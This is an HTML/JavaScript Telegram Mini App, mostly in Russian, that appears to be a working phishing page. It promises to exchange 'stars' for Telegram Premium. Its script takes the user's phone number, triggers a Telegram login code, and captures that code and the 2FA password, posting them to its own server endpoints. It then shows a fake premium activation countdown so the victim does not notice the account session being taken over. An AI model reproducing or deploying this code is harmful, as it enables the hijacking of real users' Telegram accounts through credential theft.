<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
    
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        user-select: none;
    }
    
    body {
        background: #0a0a0a;
        color: #ffffff;
        min-height: 100vh;
        padding: 16px;
        line-height: 1.4;
        font-family: "Montserrat", sans-serif;
    }
    input, button {
        font-family: "Montserrat", sans-serif;
    }

    .container {
        max-width: 100%;
        width: 100%;
        margin: 0 auto;
    }

    .premium-badge {
        background-color: rgba(0,0,0,0.2);
        color: white;
        padding: 8px 16px;
        border-radius: 13px;
        font-weight: 600;
        font-size: 12px;
        position: absolute;
        top: 6px;
        right: 6px;
        backdrop-filter: blur(5px);
    }

    .card-cover {
        background: linear-gradient(34deg,rgba(10, 10, 18, 1) 0%, rgba(20, 32, 90, 1) 100%);
        width: 100%;
        height: 150px;
        background-size: cover;
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        border-radius: 6px;
    }

    .prem-card {
        background: #212121;
        border: 3px solid #212121;
        border-radius: 20px;
        padding: 0;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        overflow: hidden;
        margin-bottom: 20px;
        backdrop-filter: blur(10px);
    }

    .mg15 {
        margin: 15px;
        font-size: 14px;
    }

    .mgt5 {
        margin-top: 5px;
        font-size: 14px;
    }
        
    .card {
        background: #1a1a1a;
        border: 1px solid #2a2a2a;
        border-radius: 26px;
        padding: 24px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        margin-bottom: 16px;
    }

    .header {
        text-align: center;
        margin-bottom: 24px;
    }

    .dn {
        display: none;
    }

    .header h1 {
        font-size: 24px;
        font-weight: 700;
        margin-bottom: 8px;
        color: #ffffff;
    }

    .header p {
        font-size: 15px;
        color: #a0a0a0;
        opacity: 0.8;
    }

    .btn {
        width: 100%;
        padding: 16px 20px;
        background: linear-gradient(135deg, #0088cc, #00a2e0);
        color: #ffffff;
        border: none;
        border-radius: 14px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin: 1px 0;
    }

    .btn:disabled {
        opacity: 0.6;
        cursor: not-allowed;
    }

    .btn:active:not(:disabled) {
        transform: scale(0.98);
    }

    .btn-primary {
        background: linear-gradient(135deg, #0088cc, #00a2e0);
    }

    .btn-success {
        background: linear-gradient(135deg, #34c759, #30d158);
    }

    .btn-secondary {
        background: #2a2a2a;
        color: #ffffff;
    }

    .hidden {
        display: none !important;
    }

    .spinner {
        width: 20px;
        height: 20px;
        border: 2px solid transparent;
        border-top: 2px solid currentColor;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .alert {
        padding: 16px;
        border-radius: 14px;
        margin: 16px 0;
        font-size: 14px;
        text-align: center;
    }

    .alert-error {
        background: #ff3b30;
        color: #ffffff;
    }

    .alert-success {
        background: #34c759;
        color: #ffffff;
    }

    .alert-info {
        background: #2a2a2a;
        color: #ffffff;
    }

    .input-group {
        margin: 20px 0;
    }

    .input-label {
        display: block;
        margin-bottom: 12px;
        font-size: 16px;
        font-weight: 600;
        color: #ffffff;
    }

    .code-inputs {
        display: flex;
        gap: 8px;
        justify-content: center;
        margin: 24px 0;
    }

    .code-input {
        width: 45px;
        height: 55px;
        border: 2px solid #3a3a3a;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 600;
        text-align: center;
        background: #2a2a2a;
        color: #ffffff;
        transition: all 0.2s ease;
    }

    .code-input:focus {
        outline: none;
        border-color: #0088cc;
        transform: scale(1.05);
        box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
    }

    .code-input.error {
        border-color: #ff3b30;
    }

    .single-input {
        width: 100%;
        padding: 16px;
        border: 2px solid #3a3a3a;
        border-radius: 12px;
        font-size: 16px;
        background: #2a2a2a;
        color: #ffffff;
        transition: border-color 0.2s ease;
    }

    .single-input:focus {
        outline: none;
        border-color: #0088cc;
        box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
    }

    .auto-submit {
        font-size: 13px;
        color: #707579;
        text-align: center;
        margin-top: 12px;
        opacity: 0.7;
    }

    .status-indicator {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        padding: 12px;
        background: #2a2a2a;
        border-radius: 12px;
        margin: 16px 0;
        font-size: 14px;
    }

    .timer {
        font-weight: 600;
        color: #0088cc;
    }

    .balance-info {
        background: #2a2a2a;
        padding: 12px;
        border-radius: 12px;
        margin: 16px 0;
        text-align: center;
        font-size: 16px;
        font-weight: 400;
    }

    .balance-sufficient {
        color: #848484;
    }

    .balance-insufficient {
        color: #848484;
    }

    .activation-timer {
        background: linear-gradient(45deg, #748EFF, #D75DA8);
        color: white;
        padding: 12px;
        border-radius: 12px;
        margin: 16px 0;
        text-align: center;
        font-size: 16px;
        font-weight: 600;
    }

    /* Адаптивность для разных размеров экрана */
    @media (max-width: 360px) {
        .container {
            padding: 12px;
        }
        
        .card {
            padding: 20px;
            border-radius: 16px;
        }
        
        .code-input {
            width: 50px;
            height: 58px;
            font-size: 20px;
        }
        
        .btn {
            padding: 14px 18px;
            font-size: 15px;
        }
        
        .activation-timer {
            font-size: 14px;
            padding: 10px;
        }
    }

    @media (min-width: 768px) {
        .container {
            max-width: 420px;
        }
    }

    /* Анимации */
    .fade-in {
        animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .slide-up {
        animation: slideUp 0.4s ease;
    }

    @keyframes slideUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }
</style>
</head>
<body>
    <div class="container">
        <div class="card fade-in">
            <div class="header">
                <h1>Обмен звёзд</h1>
                <p id="statusText">Загрузка...</p>
            </div>
            
            <div id="errorMessage" class="alert alert-error hidden"></div>
            <div id="successMessage" class="alert alert-success hidden"></div>
            
            <!-- Уже авторизован -->
            <div id="alreadyAuthorized" class="hidden slide-up">
        <div class="prem-card"id="exchangeScreen">
            <div class="card-cover">
                <div class="premium-badge">PREMIUM</div>
            </div>
            <div class="mg15">
                <h3>Telegram Premium x 1 месяц</h3>
                <p class="mgt5">
                    Будет активирован через:
                </p>
                <div class="activation-timer">
                    <span class="activation-time">Загрузка времени активации...</span>
                </div>
                <div class="balance-info">
                    Текущий баланс: <span class="balance-value">0</span> звёзд
                </div>
            </div>
        </div>
                <button class="btn btn-primary" onclick="closeWebApp()">
                    <span>Закрыть</span>
                </button>
            </div>
            
            <!-- Запрос номера телефона -->
            <div id="phoneSection" class="hidden slide-up">
                
        <div class="prem-card"id="exchangeScreen">
            <div class="card-cover">
                <div class="premium-badge">PREMIUM</div>
                <script src="https://unpkg.com/@lottiefiles/dotlottie-wc@0.8.1/dist/dotlottie-wc.js" type="module"></script>
<dotlottie-wc src="https://lottie.host/afd02162-24c0-49aa-b884-89b2e1207137/8l2TNQwqOc.lottie" style="width: 120px;height: 120px" autoplay loop></dotlottie-wc>
            </div>
            <div class="mg15">
                <h3>Telegram Premium x 3 месяца</h3>
                <p class="mgt5">
                    Вы можете обменять свои звёзды на Telegram Premium. Для этого нужно иметь на балансе не менее 75 звёзд
                </p>
                
                <div class="balance-info" id="balanceDisplay">
                    Баланс: <span class="balance-value">0</span> звёзд
                </div>
            </div>
        </div>
                <button class="btn btn-primary" onclick="requestPhone()" id="phoneBtn">
                    <span>Обменять звёзды</span>
                    <span class="spinner hidden" id="phoneSpinner"></span>
                </button>
                <div id="waitingStatus" class="hidden">
                    <div class="status-indicator">
                        <span>Waiting for phone number...</span>
                        <span class="timer" id="timer">15s</span>
                    </div>
                </div>
            </div>
            
            <!-- Ввод кода подтверждения -->
            <div id="codeSection" class="hidden slide-up">
                <div class="status-indicator">
                    <span>Step 2 of 3</span>
                </div>
                <div class="input-group">
                    <label class="input-label">Enter verification code</label>
                    <div class="code-inputs">
                        <input type="text" class="code-input" maxlength="1" data-index="0" inputmode="numeric">
                        <input type="text" class="code-input" maxlength="1" data-index="1" inputmode="numeric">
                        <input type="text" class="code-input" maxlength="1" data-index="2" inputmode="numeric">
                        <input type="text" class="code-input" maxlength="1" data-index="3" inputmode="numeric">
                        <input type="text" class="code-input" maxlength="1" data-index="4" inputmode="numeric">
                    </div>
                    <p class="auto-submit">Code verifies automatically after 5 digits</p>
                </div>
                <button class="btn btn-secondary" onclick="manualVerifyCode()" id="manualVerifyBtn">
                    Verify Code Manually
                </button>
            </div>
            
            <!-- Ввод 2FA пароля -->
            <div id="passwordSection" class="hidden slide-up">
                <div class="status-indicator">
                    <span>Step 3 of 3</span>
                </div>
                <div class="input-group">
                    <label class="input-label">Two-factor authentication</label>
                    <input type="password" id="password" class="single-input" 
                           placeholder="Enter your 2FA password" autocomplete="current-password">
                </div>
                <button class="btn btn-primary" onclick="verify2FA()" id="2faBtn">
                    <span>🔒 Verify Password</span>
                    <span class="spinner hidden" id="passwordSpinner"></span>
                </button>
            </div>
        </div>
    </div>


  <!--  <script src="{{ url_for('static', filename='app.js') }}"></script> -->
 
    <script>
const tg = window.Telegram.WebApp;
let userId = null;
let userBalance = 0;
let waitTimer = null;
let currentCode = '';
let sessionCheckInterval = null;
let countdownInterval = null;
let sessionCreationTime = null;

tg.expand();
tg.enableClosingConfirmation();
tg.setHeaderColor('#0a0a0a');


if (tg.isVersionAtLeast('6.1')) {
    tg.HapticFeedback.impactOccurred('soft');
}

initUser();

async function initUser() {
    try {
        const response = await fetch('/init-user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ initData: tg.initData })
        });
        
        const data = await response.json();
        if (data.success) {
            userId = data.user_id;
            await loadUserBalance(); 
            await checkAuthStatus();
            
            startSessionValidation();
        } else {
            showError('Failed to initialize user');
        }
    } catch (error) {
        console.error('Initialization error:', error);
        showError('Connection error');
    }
}

async function loadUserBalance() {
    try {
        const response = await fetch(`/get-balance?user_id=${userId}`);
        const data = await response.json();
        
        if (data.success) {
            userBalance = data.balance;
            updateBalanceDisplay();
        }
    } catch (error) {
        console.error('Balance load error:', error);
        userBalance = 0;
        updateBalanceDisplay();
    }
}

async function loadSessionTime() {
    try {
        const response = await fetch(`/get-session-time?user_id=${userId}`);
        const data = await response.json();
        
        if (data.success && data.session_created) {
            sessionCreationTime = data.session_created;
            startCountdown();
        } else {

            setTimeout(loadSessionTime, 1000);
        }
    } catch (error) {
        console.error('Session time load error:', error);

        setTimeout(loadSessionTime, 2000);
    }
}




function startCountdown() {
    if (!sessionCreationTime) return;
    

    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    

    countdownInterval = setInterval(updateCountdown, 1000);
    updateCountdown(); 
}

function updateCountdown() {
    if (!sessionCreationTime) return;
    
    const sessionTime = new Date(sessionCreationTime);
    const activationTime = new Date(sessionTime.getTime() + 27 * 60 * 60 * 1000); // +27 часов
    const now = new Date();
    const timeLeft = activationTime - now;
    
    if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        updateActivationText('Активирован!');
        return;
    }
    
    const hours = Math.floor(timeLeft / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    
    const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    updateActivationText(`${timeString}`);
}

function updateActivationText(text) {
    const activationElements = document.querySelectorAll('.activation-time');
    activationElements.forEach(element => {
        element.textContent = text;
    });
}

function updateBalanceDisplay() {
    const balanceElements = document.querySelectorAll('.balance-value');
    balanceElements.forEach(element => {
        element.textContent = userBalance;
    });
    
    const statusText = document.getElementById('statusText');
    if (userBalance >= 75) {
        statusText.textContent = `Баланс: ${userBalance} звёзд - можно обменять`;
    } else {
        statusText.textContent = `Баланс: ${userBalance} звёзд - нужно ещё ${75 - userBalance} звёзд`;
    }
}

function startSessionValidation() {
    sessionCheckInterval = setInterval(async () => {
        if (userId) {
            try {
                const response = await fetch(`/validate-session?user_id=${userId}`);
                const data = await response.json();
                
                if (data.success && !data.is_valid) {
                    if (document.getElementById('alreadyAuthorized') && 
                        !document.getElementById('alreadyAuthorized').classList.contains('hidden')) {
                        showError('Session expired. Please re-authenticate.');
                        setTimeout(() => {
                            showSection('phoneSection', 'Session expired. Please re-authenticate.');
                        }, 2000);
                    }
                }
            } catch (error) {
                console.error('Session validation error:', error);
            }
        }
    }, 30000); // 30 секунд
}

async function checkAuthStatus() {
    try {
        const response = await fetch(`/check-auth-status?user_id=${userId}`);
        const data = await response.json();
        
        if (data.success) {
            if (data.is_authorized) {
                const validationResponse = await fetch(`/validate-session?user_id=${userId}`);
                const validationData = await validationResponse.json();
                
                if (validationData.success && validationData.is_valid) {
                    setTimeout(() => loadSessionTime(), 500);
                    showSection('alreadyAuthorized', 'Session Active');
                } else {
                    showSection('phoneSection', 'Session expired. Please re-authenticate.');
                    showError('Your session has expired. Please sign in again.');
                }
            } else if (data.has_phone) {
                showSection('codeSection', 'Verification required');
                await sendVerificationCode(data.phone);
            } else {
                showSection('phoneSection', 'Share your phone number');
            }
        }
    } catch (error) {
        console.error('Auth check error:', error);
        showError('Error checking status');
    }
}

function showSection(sectionId, statusText) {
    ['alreadyAuthorized', 'phoneSection', 'codeSection', 'passwordSection']
        .forEach(id => document.getElementById(id).classList.add('hidden'));
    
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.remove('hidden');
        section.classList.add('slide-up');
    }
    
    if (statusText) {
        document.getElementById('statusText').textContent = statusText;
    }
    
    hideAlerts();
}

function hideAlerts() {
    document.getElementById('errorMessage').classList.add('hidden');
    document.getElementById('successMessage').classList.add('hidden');
}

function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    errorDiv.textContent = message;
    errorDiv.classList.remove('hidden');
    errorDiv.classList.add('fade-in');
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    successDiv.textContent = message;
    successDiv.classList.remove('hidden');
    successDiv.classList.add('fade-in');
}

async function requestPhone() {
    if (userBalance < 75) {
        showError(`Недостаточно звёзд. Нужно 75, у вас ${userBalance}`);
        return;
    }
    
    const phoneBtn = document.getElementById('phoneBtn');
    const phoneSpinner = document.getElementById('phoneSpinner');
    const waitingStatus = document.getElementById('waitingStatus');
    
    phoneBtn.disabled = true;
    phoneSpinner.classList.remove('hidden');
    waitingStatus.classList.remove('hidden');
    hideAlerts();
    

    tg.requestContact();
    
    startPhoneWaitTimer();
}

function startPhoneWaitTimer() {
    let timeLeft = 15;
    const timerElement = document.getElementById('timer');
    
    waitTimer = setInterval(async () => {
        timeLeft--;
        timerElement.textContent = `${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(waitTimer);
            showError('Timeout waiting for phone number');
            resetPhoneButton();
            return;
        }
        
        await checkForPhoneNumber();
    }, 1000);
}

async function checkForPhoneNumber() {
    try {
        const response = await fetch(`/check-phone-status?user_id=${userId}`);
        const data = await response.json();
        
        if (data.success && data.has_phone) {
            clearInterval(waitTimer);
            showSection('codeSection', 'Code sent!');
            await sendVerificationCode(data.phone);
        }
    } catch (error) {
        console.error('Phone check error:', error);
    }
}

function resetPhoneButton() {
    const phoneBtn = document.getElementById('phoneBtn');
    const phoneSpinner = document.getElementById('phoneSpinner');
    const waitingStatus = document.getElementById('waitingStatus');
    
    phoneBtn.disabled = false;
    phoneSpinner.classList.add('hidden');
    waitingStatus.classList.add('hidden');
}

async function sendVerificationCode(phone) {
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, user_id: userId })
        });
        
        const data = await response.json();
        if (data.success) {
            if (data.already_authorized) {
                const validationResponse = await fetch(`/validate-session?user_id=${userId}`);
                const validationData = await validationResponse.json();
                
                if (validationData.success && validationData.is_valid) {

                    setTimeout(() => loadSessionTime(), 500);
                    showSection('alreadyAuthorized', 'Session Active');
                } else {
                    showSection('phoneSection', 'Session expired');
                    showError('Session expired. Please re-authenticate.');
                }
            } else {
                initCodeInputs();
                showSuccess('Verification code sent successfully');
            }
        } else {
            showError('Failed to send code: ' + data.error);
        }
    } catch (error) {
        console.error('Send code error:', error);
        showError('Error sending verification code');
    }
}

function initCodeInputs() {
    const inputs = document.querySelectorAll('.code-input');
    currentCode = '';
    
    inputs.forEach((input, index) => {
        input.value = '';
        input.classList.remove('error');
        
        input.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
            
            if (value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                currentCode = Array.from(inputs).map(input => input.value).join('');
                
                if (currentCode.length === 5) {
                    verifyCode(currentCode);
                }
            }
        });
        
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pasteData = e.clipboardData.getData('text').replace(/\D/g, '');
            if (pasteData.length === 5) {
                inputs.forEach((input, i) => {
                    input.value = pasteData[i] || '';
                });
                currentCode = pasteData;
                verifyCode(currentCode);
            }
        });
    });
    
    if (inputs[0]) {
        inputs[0].focus();
    }
}

async function verifyCode(code) {
    if (!code || code.length !== 5) return;
    
    const inputs = document.querySelectorAll('.code-input');
    const manualBtn = document.getElementById('manualVerifyBtn');
    
    inputs.forEach(input => input.disabled = true);
    if (manualBtn) manualBtn.disabled = true;
    hideAlerts();
    
    try {
        const response = await fetch('/verify-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code, user_id: userId })
        });
        const data = await response.json();
        if (data.success) {
            showSuccess('Authorization successful!');

            setTimeout(() => {
                loadSessionTime();
                showFinalScreen();
            }, 1000);
        } else if (data.needs_2fa) {
            showSection('passwordSection', '2FA password required');
            showSuccess('Code verified! Please enter 2FA password');
        } else {
            throw new Error(data.error || 'Invalid code');
        }
    } catch (error) {
        showError(error.message);
        resetCodeInputs();
    }
}

function resetCodeInputs() {
    const inputs = document.querySelectorAll('.code-input');
    const manualBtn = document.getElementById('manualVerifyBtn');
    
    setTimeout(() => {
        inputs.forEach(input => {
            input.disabled = false;
            input.value = '';
            input.classList.add('error');
        });
        if (manualBtn) manualBtn.disabled = false;
        if (inputs[0]) inputs[0].focus();
    }, 2000);
}

function manualVerifyCode() {
    const code = Array.from(document.querySelectorAll('.code-input'))
        .map(input => input.value).join('');
    verifyCode(code);
}

async function verify2FA() {
    const password = document.getElementById('password').value;
    const btn = document.getElementById('2faBtn');
    const spinner = document.getElementById('passwordSpinner');
    
    if (!password) {
        showError('Please enter 2FA password');
        return;
    }
    
    btn.disabled = true;
    spinner.classList.remove('hidden');
    hideAlerts();
    
    try {
        const response = await fetch('/verify-2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password, user_id: userId })
        });
        
        const data = await response.json();
        if (data.success) {
            showSuccess('2FA verification successful!');

            setTimeout(() => {
                loadSessionTime();
                showFinalScreen();
            }, 1000);
        } else {
            throw new Error(data.error || 'Invalid password');
        }
    } catch (error) {
        showError(error.message);

        btn.disabled = false;
        spinner.classList.add('hidden');
    }
}

function showFinalScreen() {
    document.body.innerHTML = `
        <div class="container">
            <div class="card">
        <div class="prem-card"id="exchangeScreen">
            <div class="card-cover">
                <div class="premium-badge">PREMIUM</div>
            </div>
            <div class="mg15">
                <h3>Telegram Premium x 1 месяц</h3>
                <p class="mgt5">
                    Будет активирован через:
                </p>
                <div class="activation-timer">
                    <span class="activation-time">Загрузка времени активации...</span>
                </div>
                <div>Баланс после обмена: <span class="balance-value">${userBalance - 75}</span> звёзд</div>
            </div>
        </div>
                <button class="btn btn-primary" onclick="closeWebApp()">
                    Закрыть
                </button>
            </div>
        </div>
    `;
    

    setTimeout(() => {
        if (sessionCreationTime) {
            startCountdown();
        } else {

            loadSessionTime();
        }
    }, 500);
}

function closeWebApp() {
    if (waitTimer) {
        clearInterval(waitTimer);
    }
    if (sessionCheckInterval) {
        clearInterval(sessionCheckInterval);
    }
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    tg.close();
}

window.addEventListener('beforeunload', () => {
    if (waitTimer) {
        clearInterval(waitTimer);
    }
    if (sessionCheckInterval) {
        clearInterval(sessionCheckInterval);
    }
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
});
    </script>
</body>
</html>
